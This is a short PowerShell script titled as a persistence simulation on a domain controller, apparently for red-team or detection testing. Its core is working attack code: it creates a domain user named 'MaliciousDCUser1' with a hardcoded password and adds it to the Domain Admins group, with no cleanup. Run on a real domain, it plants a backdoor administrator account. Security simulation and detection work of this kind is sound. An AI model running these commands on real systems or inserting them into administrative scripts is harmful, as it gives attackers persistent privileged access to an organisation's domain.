# Persistence Tactic Simulation on Domain Controller (DC)

# Set output file path
$outputFile = "PersistenceDCOutput.txt"

# Function to write output to file
function Write-OutputToFile {
    param(
        [string]$content
    )
    $content | Out-File -Append -FilePath $outputFile
}

# Start logging the script
Write-OutputToFile "Persistence Simulation Started on Domain Controller at $(Get-Date)"
Write-OutputToFile ""

# Create a new user with Domain Administrator privileges (for persistence)
Write-OutputToFile "Attempting to create a new user with Domain Administrator privileges..."
$newUser = "MaliciousDCUser1"
$password = "P@ssw0rd!"
# Create the user in the Domain
New-ADUser -SamAccountName $newUser -UserPrincipalName "$newUser@domain.com" -Name $newUser -GivenName "Malicious" -Surname "User" -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText $password -Force) -PassThru
# Add the user to the Domain Admins group
Add-ADGroupMember -Identity "Domain Admins" -Members $newUser
Write-OutputToFile "New domain user '$newUser' created and added to the 'Domain Admins' group."

Write-OutputToFile ""

# End of Persistence Simulation on Domain Controller
Write-OutputToFile "Persistence Simulation Ended on Domain Controller at $(Get-Date)"
